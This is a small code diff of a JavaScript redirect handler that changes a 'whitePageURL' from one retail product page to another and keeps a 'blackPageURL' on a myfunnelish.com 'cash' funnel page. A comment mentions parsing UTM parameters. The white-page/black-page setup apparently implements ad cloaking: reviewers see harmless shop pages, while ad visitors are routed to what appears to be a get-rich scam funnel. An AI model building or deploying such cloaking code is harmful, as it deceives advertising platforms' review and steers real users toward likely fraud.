@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.falke.com/us_en/p/ru4-endurance-cool-short-men-running-short-socks/16170_8018/?trackingtoken=Category_Page%7Coutput1%7CA%7Cdefault_campaigns%7Ccategory%20to%20topseller(clicks)%7CC2T_sale";
+    const whitePageURL = "https://www.tkmaxx.com/uk/en/home/home-rooms/bathroom/turquoise-crane-hand-towel/p/62353059";
     const blackPageURL = "https://VXAJXfDwZd.myfunnelish.com/cash-1735686017557538";
   
     // Parse the UTM parameters from the request URL
